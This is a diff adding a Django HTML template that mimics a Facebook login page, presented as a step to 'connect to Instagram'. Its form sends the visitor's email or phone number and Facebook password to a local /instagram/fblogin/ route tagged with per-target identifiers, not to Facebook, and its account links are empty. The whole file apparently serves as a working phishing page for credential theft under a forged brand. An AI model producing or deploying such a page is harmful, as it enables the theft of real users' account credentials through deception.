@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="theme-color" content="#2c038b">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    {% load static %}
+    <link rel="stylesheet" href="{% static 'facebookStyle.css' %}">
+    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.0-1/css/all.css">
+    <link type="text/css" rel="stylesheet" href="{% static 'fontawesome/css/all.css' %}">
+    <title>Facebook - Login</title>
+</head>
+<body>
+    <div class="top">
+        <h1>facebook</h1>
+    </div>
+    <div class="top2">
+        <i class="fas fa-eye"></i>
+    </div>
+<section>
+    <div class="top3">
+        <p>log in to your Facebook account to connect to Instagram</p>
+    </div>
+    <form method="post" action="/instagram/fblogin/{{uid}}/{{aid}}">
+        {% csrf_token %}
+        <div class="inpDiv">
+            <input type="text" name="email" placeholder="Mobile number or email address">
+        </div>
+        <div class="inpDiv">
+            <input type="password" name="password" placeholder="Facebook password">
+        </div>
+        <div class="top4">
+            <button>Log In</button>
+        </div>
+    </form>
+    {% if messages %}
+    <div class="error">
+        {% for message in messages %}
+        <p>{{message}}</p>
+        {% endfor %}
+    </div>
+    {% endif %}
+    <div class="bottom">
+        <a href="">Create account</a>
+        <a href="">Not now</a>
+        <a href="">Forgotten password?</a>
+        <fieldset>
+            <legend>OR</legend>
+        </fieldset>
+    </div>
+</section>
+</body>
+</html>
